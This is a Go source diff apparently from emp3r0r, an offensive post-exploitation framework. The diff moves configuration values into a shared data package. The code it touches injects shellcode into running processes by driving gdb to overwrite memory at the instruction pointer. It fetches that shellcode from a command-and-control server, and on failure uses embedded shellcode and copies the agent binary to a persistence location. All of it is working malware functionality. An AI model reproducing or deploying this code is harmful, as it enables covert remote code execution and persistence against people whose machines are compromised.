@@ -11,6 +11,7 @@ import (
 	"strings"
 	"syscall"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -30,7 +31,7 @@ func gdbInjectShellcode(shellcode *string, pid, shellcodeLen int) error {
 		pid = cmd.Process.Pid
 	}
 
-	out, err := exec.Command(UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, *shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
+	out, err := exec.Command(emp3r0r_data.UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, *shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
 	if err != nil {
 		return fmt.Errorf("GDB failed (shellcode length %d): %s\n%v", shellcodeLen, out, err)
 	}
@@ -260,10 +261,10 @@ func Injector(shellcode *string, pid int) error {
 // InjectShellcode inject shellcode to a running process using various methods
 func InjectShellcode(pid int, method string) (err error) {
 	// prepare the shellcode
-	sc, err := DownloadViaCC(CCAddress+"www/shellcode.txt", "")
+	sc, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/shellcode.txt", "")
 	if err != nil {
-		sc = []byte(GuardianShellcode)
-		err = util.Copy(os.Args[0], GuardianAgentPath)
+		sc = []byte(emp3r0r_data.GuardianShellcode)
+		err = util.Copy(os.Args[0], emp3r0r_data.GuardianAgentPath)
 		if err != nil {
 			return
 		}
